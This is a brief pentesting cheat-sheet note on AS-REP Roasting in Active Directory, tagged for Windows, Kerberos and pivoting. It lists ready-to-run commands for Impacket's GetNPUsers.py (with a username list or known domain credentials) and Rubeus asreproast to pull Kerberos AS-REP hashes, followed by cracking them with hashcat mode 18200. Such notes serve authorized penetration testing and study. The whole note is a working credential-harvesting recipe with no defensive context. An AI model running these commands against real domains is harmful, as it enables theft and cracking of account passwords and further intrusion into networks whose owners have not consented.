---
id: AS-REP Roasting
aliases:
  - AS-REP Roasting
tags:
  - windows
  - AD
  - passwords
  - pivoting
  - kerberos
---
## From Linux

1. Use Impacket's GetNPUsers script:
```bash
# Brute-forcing usernames
GetNPUsers.py -dc-ip "$DC_IP" -usersfile "$USERS_FILE" -format hashcat -outputfile "$OUTFILE"

# Knowing domain creds
GetNPUsers.py -dc-ip "$DC_IP" -request -format hashcat -outputfile "$OUTFILE" "$DOMAIN/$USER"
```

2. Crack with hashcat mode 18200


## From Windows

1. Use Rubeus with asreproast:
```powershell
.\Rubeus.exe asreproast /nowrap
```

2. Crack with hashcat mode 18200
